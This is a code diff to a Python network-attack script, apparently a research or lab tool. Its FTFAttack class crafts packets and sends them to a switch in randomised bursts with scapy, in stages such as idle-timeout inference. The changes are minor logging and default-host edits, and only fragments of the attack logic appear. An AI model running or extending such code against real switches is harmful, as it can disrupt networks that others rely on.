@@ -78,7 +78,7 @@ class FTFUtils:
             return None
         rtt = float(m.group(1)) #ms
         t = time.time()
-        print(t, rtt)
+        print(f"t={t}, rtt={rtt}")
         return rtt
 
     @staticmethod
@@ -111,7 +111,7 @@ class FTFUtils:
 
 class FTFAttack:
     def __init__(self, switch, iface, npacket, added_new_packets, 
-                net=None, probe_src='h7', probe_dst='h6'):
+                net=None, probe_src='h6', probe_dst='h5'):
         self.switch = switch
         self.iface = iface
         self.npacket = npacket
@@ -147,11 +147,13 @@ class FTFAttack:
         print("[*] Crafted")
         print("[*] Sending")
         i = 0
-        while i<len(packets):
+        n_pkts = len(packets)
+        while i<n_pkts:
             j = FTFUtils.random_anp(self.added_new_packets)
             sendp(packets[i:i + j], iface=self.iface.name, verbose=False)
             time.sleep(FTFUtils.random_af(self.attack_frequency))
             i += j
+            print(f"Packets {i}/{n_pkts}")
         print("[*] Sent")
 
     def stage_2(self) -> None:
@@ -171,15 +173,16 @@ class FTFAttack:
         print("[*] Crafted")
         print("[*] Sending")
         i = 0
-        while i<len(packets):
+        n_pkts = len(packets)
+        while i<n_pkts:
             j = FTFUtils.random_anp(self.added_new_packets)
             sendp(packets[0:i + j], iface=self.iface.name, verbose=False)
             time.sleep(FTFUtils.random_af(self.attack_frequency))
             i += j
+            print(f"Packets {i}/{n_pkts}")
         print("[*] Sent")
 
     def run(self):
-        """Corpo dell'attacco eseguito nel thread interno."""
         print("# [STAGE 0] Tidle Inference")
         self.stage_0()
         print("# [STAGE 1] MAC Presenting")
